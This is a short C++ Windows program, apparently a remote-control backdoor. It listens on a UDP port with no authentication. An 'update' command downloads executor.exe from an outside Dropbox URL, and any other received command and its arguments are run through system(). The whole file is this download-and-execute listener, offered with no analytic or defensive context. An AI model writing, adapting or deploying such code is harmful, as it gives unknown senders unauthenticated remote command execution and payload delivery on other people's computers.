#include <Windows.h>
#include <mmsystem.h>
#include <string>
#include <wininet.h>

#include <SFML\Network.hpp>

#include "Port.h"

sf::UdpSocket g_socket;

int main()
{
	g_socket.setBlocking(true);
	g_socket.bind(getPort());

	sf::Packet packet;
	sf::IpAddress addr;
	unsigned short port;
	
	bool exit = false;
	while (!exit)
	{
		std::string cmd;

		g_socket.receive(packet, addr, port);

		packet >> cmd;

		if (cmd == "exit")
		{
			exit = true;
		}
		else if (cmd == "update")
		{
			DeleteUrlCacheEntry("https://dl.dropbox.com/u/24385101/hakierer/executor.exe");
			HRESULT result = URLDownloadToFile(NULL, "https://dl.dropbox.com/u/24385101/hakierer/executor.exe", "executor.exe", NULL, NULL);
		}
		else
		{
			int argc;
			packet >> argc;

			std::string cmdLine = ".\\executor.exe " + cmd;

			for(int i = 0; i < argc; i++)
			{
				std::string buffer;
				packet >> buffer;

				cmdLine += " " + buffer;
			}

			system(cmdLine.c_str());
		}
	}
	return 0;
}